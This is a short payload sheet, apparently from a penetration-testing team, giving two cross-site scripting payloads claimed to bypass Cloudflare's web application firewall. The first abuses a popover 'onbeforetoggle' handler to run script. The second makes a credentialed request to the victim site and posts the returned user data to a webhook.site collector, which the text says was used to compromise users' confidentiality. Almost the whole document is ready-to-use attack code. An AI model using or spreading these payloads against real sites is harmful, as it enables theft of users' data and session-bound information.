**Cross Site Scripting Payloads**

**Cloudflare Bypass**

Global Payload working against all Cloudflare WAF:
```
yldrm" id=x popover onbeforetoggle=window.alertalert=alert;window.alertalert(1)>Click this button<button  popovertarget="x
```

At some websites, our team has also used the following payload to bypass Cloudflare and compromise confidentiality of application users:
```
yldrm<img+onbeforetoggle%3d"fetch('{Victim_site's_URL}',{method:'GET',credentials:'include'}).then(response=>response.json()).then(data=>{fetch('https://webhook.site/{webhook_id}/?userData',{method:'POST',body:JSON.stringify(data)})})%3balert('compromised')"+popover+id%3dx>XSS</img><button+popovertarget%3dx>Click+me</button>
```
